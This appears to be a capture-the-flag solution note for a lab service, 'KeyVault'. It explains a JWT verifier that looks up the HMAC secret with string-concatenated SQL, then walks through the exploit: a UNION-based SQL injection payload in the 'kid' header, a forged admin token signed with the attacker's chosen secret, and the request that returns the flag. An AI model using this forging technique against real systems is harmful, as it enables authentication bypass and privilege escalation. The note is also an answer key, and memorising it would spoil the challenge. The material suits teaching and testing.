# JWT / KidInjection — KeyVault

Bug: the verifier resolves the HMAC secret with **string-concatenated SQL**:
`SELECT key FROM signing_keys WHERE kid = '<header.kid>'`. The `kid` header
claim is attacker-controlled → SQL injection → return a secret of your choice
and the HS256 check runs with **your** key.

Why exploitable: HS256 needs only a shared secret; a `kid` of
`' UNION SELECT 'my-secret' -- ` makes the lookup return `my-secret`.

Intended path:
1. `POST /login {"username":"0xnhsec","password":"vlh-tester-01"}` → token (kid `legacy-2023`).
2. `GET /api/directory` → find the innocent account (`usr_…`, role `innocent`).
3. Forge header `{"alg":"HS256","typ":"JWT","kid":"' UNION SELECT 'my-secret' -- "}`
   and payload `{"sub":"usr_…","role":"admin"}`; HMAC-sign with `my-secret`.
4. `GET /flag/jwt` with `Authorization: Bearer <forged>` →
   `DSLTV{JWT-KidInjection-<n>}` (server injects your kid, fetches your
   secret, verifies, checks the claim pair).

Flag format: `DSLTV{JWT-KidInjection-<digits>}` — regenerated at every boot.
